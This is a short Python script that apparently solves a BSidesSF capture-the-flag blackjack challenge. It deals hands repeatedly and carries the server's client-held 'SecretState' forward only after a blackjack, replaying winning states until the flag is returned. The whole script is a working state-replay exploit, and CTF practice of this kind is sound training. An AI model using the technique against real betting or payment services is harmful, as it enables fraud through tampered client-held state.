import requests

state = requests.post('https://cards-d38741c8.challenges.bsidessf.net/api').json()['SecretState']

while True:
    res = requests.post('https://cards-d38741c8.challenges.bsidessf.net/api/deal', json = {'Bet': 500, 'SecretState': state}).json()
    if res['GameState'] == 'Blackjack':
        print(res)
        state = res['SecretState']
    if 'Flag' in res:
        print(res['Flag'])
        break